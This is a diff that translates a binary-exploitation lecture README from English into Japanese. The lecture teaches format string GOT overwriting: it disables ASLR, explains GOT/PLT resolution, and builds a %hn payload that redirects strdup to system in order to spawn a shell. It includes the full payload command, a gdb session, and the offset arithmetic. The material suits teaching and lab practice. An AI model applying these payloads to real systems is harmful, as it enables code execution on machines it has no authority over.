@@ -1,20 +1,20 @@
-# Format String Vulnerability 2
+# フォーマット文字列脆弱性 2
 
-Please disable the following before going ahead:
+先に進む前に、次のものを無効にしてください。
 1. ASLR : `echo "0" | sudo dd of=/proc/sys/kernel/randomize_va_space`.
-2. Libc randomization : `ulimit -s unlimited`.
+2. Libc のランダム化 : `ulimit -s unlimited`.
 
-I will continue the concept of arbitrary memory writes that I covered in previous lecture. If you have not been through that session, please go through it before moving forward, [Lecture 5](../Lecture5/README.md).
+前の講義で扱った、任意のメモリ書き込みの考え方を引き続き使います。まだ読んでいなければ、先に進む前にそちらを読んでください。[Lecture 5](../Lecture5/README.md)
 
-In the previous Lecture we saw that how to perform arbitrary memory writes with format string vulnerability. And in this lecture we will see how to take benefits from those vulnerabilities and spawn the shell. Yes I am not joking, we can escalate these vulnerabilities to spawn the shell.
+前の講義では、フォーマット文字列脆弱性で任意のメモリ書き込みを行う方法を見ました。この講義では、その脆弱性を利用して、シェルを起動する方法を見ます。冗談ではありません。これらの脆弱性は、シェルの起動にまで拡大できます。
 
-Before starting with the deep exploitation of this vulnerability, we will cover few of the topics required to perform the exploitation.
+この脆弱性を深く exploit する前に、exploit に必要な話題をいくつか取り上げます。
 
 ### 1. GOT
-Global offset table comes in to the picture when your program is calling the external libraries and those external libraries are dynamically linked.
-To know more about dynamic linking please follow: [this](https://en.wikipedia.org/wiki/Dynamic_linker). Dynamic linking reduces the size of binary but increase the run time complexity for the dynamic linked and also opens that path to perform GOT exploitation.
-Global offset tables(GOT) stores the actual address of the function call, in form of the actual table. But this table is itself created by dynamic linker. There is an execution flow that defines how the linker will fill the entry in those GOT.
-Consider the following program:
+Global offset table (GOT) は、プログラムが外部のライブラリを呼び出していて、その外部ライブラリが動的にリンクされているときに登場します。
+動的リンクについて詳しくは、[こちら](https://en.wikipedia.org/wiki/Dynamic_linker)を参照してください。動的リンクはバイナリのサイズを小さくしますが、動的リンクに伴う実行時の複雑さを増やし、GOT の exploit を行う道も開きます。
+Global offset table (GOT) は、関数呼び出しの実際のアドレスを、本物のテーブルの形で保存します。ただし、このテーブル自体は動的リンカ(dynamic linker)が作ります。リンカがこの GOT のエントリをどう埋めるかを定めた、実行の流れがあります。
+次のプログラムを考えます。
 
 ```C
 int main()
@@ -24,18 +24,18 @@ int main()
 }
 ```
 
-The actual `printf` ad `scanf` resides in memory at some address(that binary don't know during invocation). The compiler will create on memory table to store the address of these external functions. The point to note here is that, the shared library will contain all the functions like `print`, `scanf`, `exit`, `system` but the GOT table will only contain the entries for `printf` and `exit` as only they are used by the programs.
-And this GOT will look like:
+実際の `printf` と `scanf` は、メモリ上のあるアドレスにあります(バイナリは起動時にそのアドレスを知りません)。コンパイラは、これらの外部関数のアドレスを保存するテーブルをメモリ上に作ります。ここで注意すべき点は、共有ライブラリには `print`、`scanf`、`exit`、`system` などすべての関数が含まれますが、GOT テーブルには、プログラムが使う `printf` と `exit` のエントリだけが入ることです。
+この GOT は次のようになります。
 
 | Name     | Address   |
 |----------|-----------|
 | `printf` | UNDEFINED |
 | `scanf`  | UNDEFINED |
 
-If you see, the address during the table GOT table creation is `UNDEFINED`. When your program is loaded into the memory, it does not know the exact location of shared library which is required to call the program. Rather your share library code resides in the memory at some address, which is not known to the compiler at compile time. So the compiler introduces stub to call dynamic linker or the address of function from the GOT.
+見てのとおり、GOT テーブルを作る時点でのアドレスは `UNDEFINED` です。プログラムがメモリに読み込まれたとき、プログラムは、呼び出しに必要な共有ライブラリの正確な位置を知りません。共有ライブラリのコードは、メモリ上のあるアドレスにありますが、そのアドレスはコンパイル時にはコンパイラにもわかりません。そこでコンパイラは、動的リンカ、または GOT にある関数のアドレスを呼び出すためのスタブ(stub)を差し込みます。
 
-#### Where is the stub ?
-If you run the following command on one of the compiled binaries in this directory,
+#### スタブはどこにあるのか
+このディレクトリにあるコンパイル済みバイナリの1つに対して、次のコマンドを実行すると、
 `objdump -d ./string`
 ```
 Disassembly of section .plt:
@@ -57,17 +57,17 @@ Disassembly of section .plt:
  804838b:    e9 d0 ff ff ff           jmp    8048360 <_init+0x2c>
 ```
 
-Now I will turn this into the GOT table, and lets see how the GOT table looks like.
+これを GOT テーブルに書き直して、GOT テーブルがどのように見えるかを確認しましょう。
 
 | Memory address        | Actual address of function |
 |-----------------------|----------------------------|
 | 0x804a00c -- `printf` | UNDEFINED                  |
 | 0x804a010 -- `strdup` | UNDEFINED                  |
 
-The memory address `0x804a00c` stores the actual address to the `printf` function like wise, the call to `strdup` is stored at `0x804a010`.
-These calls in the during GOT table creation are `UNDEFINED` and this you cant, identify with objdump. You need to use a debugger to check if these call are blank in the beginning or not. I use `Hopper` for this.
+メモリアドレス `0x804a00c` には `printf` 関数の実際のアドレスが保存されます。同様に、`strdup` の呼び出し先は `0x804a010` に保存されます。
+GOT テーブルを作る時点では、これらは `UNDEFINED` で、objdump では確認できません。これらが最初は空かどうかを確認するには、デバッガを使う必要があります。私はこれに `Hopper` を使っています。
 
-If these GOT entries are blank in the beginning then, who fills these address to resolve the context. This is where the call to dynamic linker comes into the picture.
+これらの GOT エントリが最初は空だとすると、その文脈を解決するために、誰がこれらのアドレスを埋めるのでしょうか。ここで、動的リンカの呼び出しが登場します。
 
 ```
            Disassembly of section .plt:
@@ -90,20 +90,20 @@ If these GOT entries are blank in the beginning then, who fills these address to
 
 ```
 
-`<printf@plt+0x10>` this is where the Dynamic linker comes into the picture. When the control flows from, function call it goes to the GOT, since during the first call the GOT entry is blank, so the `jmp    *0x804a010` instruction has no effect at all. So the control goes to the next line which `push $0x0, jump 8048360`, the latter jump instruction is nothing but the address of the dynamic linker. Then the dynamic linker is responsible for resolving the call and update the GOT entry. Then the subsequent calls are made using the address in GOT.
+`<printf@plt+0x10>` が、動的リンカが登場する場所です。関数呼び出しから制御が流れると GOT に行きますが、最初の呼び出しでは GOT のエントリが空なので、`jmp    *0x804a010` 命令はまったく効果がありません。そのため制御は次の行の `push $0x0, jump 8048360` に進み、後者のジャンプ命令の行き先が、動的リンカのアドレスにほかなりません。そして動的リンカが、呼び出しを解決して GOT のエントリを更新します。以降の呼び出しは、GOT にあるアドレスを使って行われます。
 
 
-Introducing GOT in the program, open up several paths for exploitation. Suppose the in case we are able to write some sane address on to address of `0x804a00c` which is the address where the address for `printf` will be updated by the linker then we can make our program go to our location when the `printf` will be called, what about `system`. It will make `printf` behave like `system`. This concept called **GOT exploitation**.
+プログラムに GOT があることで、exploit の道がいくつか開けます。たとえば、リンカが `printf` のアドレスを更新する場所である `0x804a00c` に、何か適当なアドレスを書き込めたとします。すると、`printf` が呼ばれたときに、プログラムを私たちの望む場所へ向かわせられます。`system` にしたらどうでしょうか。`printf` が `system` のように動作します。この考え方を **GOT exploitation** と呼びます。
 
 
-#### Connecting the dots :smiling_imp:
-1. We know how to make format string write to an arbitrary address.
-2. We know how the functions are called.
+#### 点と点をつなぐ :smiling_imp:
+1. フォーマット文字列で任意のアドレスに書き込ませる方法がわかっている。
+2. 関数がどう呼び出されるかがわかっている。
 
 ```C
 #include <stdio.h>
 #include <string.h>
-// compile with gcc -m32 temp.c
+// gcc -m32 temp.c でコンパイルする
 
 void foo(char *ch)
 {
@@ -122,20 +122,20 @@ int main(int argc, char** argv)
 
 ```
 
-We will overwrite the GOT entry of `strdup` with the address of `system`, so when the `strdup(buf)` is called, `system(buf)` executes. And if gave `/bin/sh` input as `buf`, then `system(/bin/sh"")` will exploit the shell.
+`strdup` の GOT エントリを `system` のアドレスで上書きします。すると、`strdup(buf)` が呼ばれたときに `system(buf)` が実行されます。`buf` として `/bin/sh` を入力すれば、`system(/bin/sh"")` によってシェルを exploit できます。
 
-Writing an address using `%n` will be difficult as there is limit on the size of the number that can be written using %n, so will be splitting the address using the concept of `%hn` which is used to write, **2 bytes** at a time.
+`%n` でアドレスを書き込むのは難しくなります。%n で書き込める数の大きさには限りがあるからです。そこで、一度に **2バイト** を書き込む `%hn` の考え方を使って、アドレスを分割します。
 
-Lets craft our payload which would look something like this:
+ペイロードを作りましょう。次のような形になります。
 ``./string `python -c 'import struct; print "sh;#" + struct.pack("<I", <SOME_ADDRESS>) + struct.pack("<I", <SOME_ADDRESS>) +"%<SOME_VALUE>x%11$hn%<SOME_VALUE>x%12$hn"'` ``
 
-**11** and **12** are offsets to my location of buffer `buf` form the `printf` function call. This could be different in your case. You need to follow the concept discussed in previous lecture.
+**11** と **12** は、`printf` 関数の呼び出しから、私のバッファ `buf` の位置までのオフセットです。あなたの環境では異なる可能性があります。前の講義で説明した考え方に従って求めてください。
 
-We now have the offset on which we will write our address of `system` function in two parts, but we know that `%hn` will the number of characters printed with `printf` we have to print `len(address(system))` length of garbage. Since our string is limited in size, we cant do that as well. For that we need to take help from the `%x` format specifier. `%(n)x` format specifier will print `(n)` number of spaces in the output but will not increase the size of input string. :cool:
+これで、`system` 関数のアドレスを2つに分けて書き込む先のオフセットがわかりました。しかし、`%hn` は `printf` で出力された文字数を書き込むので、`len(address(system))` の長さのごみ文字を出力しなければなりません。文字列のサイズには限りがあるので、それもできません。そこで `%x` フォーマット指定子の助けを借ります。`%(n)x` フォーマット指定子は、出力に `(n)` 個の空白を出力しますが、入力文字列のサイズは増やしません。:cool:
 
-The final payload may look like this
+最終的なペイロードは次のようになるでしょう。
 ``./string `python -c 'import struct; print "sh;#" + struct.pack("<I", 0x804a010) + struct.pack("<I", 0x804a012) +"%10948x%11$hn%13068x%12$hn"'` ``
-Now lets take a look at how I found the address of the system,
+では、私が system のアドレスをどうやって見つけたかを見てみましょう。
 ```bash
 $ gdb ./string
 GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1
@@ -170,7 +170,7 @@ gef➤  p system
 $1 = {<text variable, no debug info>} 0x555c2da0 <system>
 ```
 
-Now we have the address of `system` we now need to covert this address to the count for `%(n)x`. And that we will do in two parts.
+これで `system` のアドレスがわかりました。次に、このアドレスを `%(n)x` のための数に変換する必要があります。これを2つに分けて行います。
 ```python
 >>> 0x2ad0 - 12
 10948
@@ -178,11 +178,11 @@ Now we have the address of `system` we now need to covert this address to the co
 13068
 ```
 
-This 2-split address that we calculated with `python` will be the value for `n` in `%x`.
+`python` で計算した、この2つに分けたアドレスが、`%x` の `n` の値になります。
 
-#### Final words.
-1. Find out the address offset of buffer from printf.
-2. Add `sh;#` to the beginning of buffer, followed by the address of GOT function location.
-3. This address will be two parts, `base address of GOT`, `base address of GOT + 2`.
-4. Write two bytes of content (`address of system function call`) to the address specified in buffer.
-5. Why not run the exploit? :cool:
+#### 最後に
+1. printf からバッファまでのアドレスのオフセットを調べます。
+2. バッファの先頭に `sh;#` を加え、その後ろに GOT の関数の位置のアドレスを続けます。
+3. このアドレスは2つに分かれます。`GOT の基底アドレス` と `GOT の基底アドレス + 2` です。
+4. バッファで指定したアドレスに、2バイトの内容(`system 関数の呼び出しのアドレス`)を書き込みます。
+5. exploit を実行してみませんか。:cool:
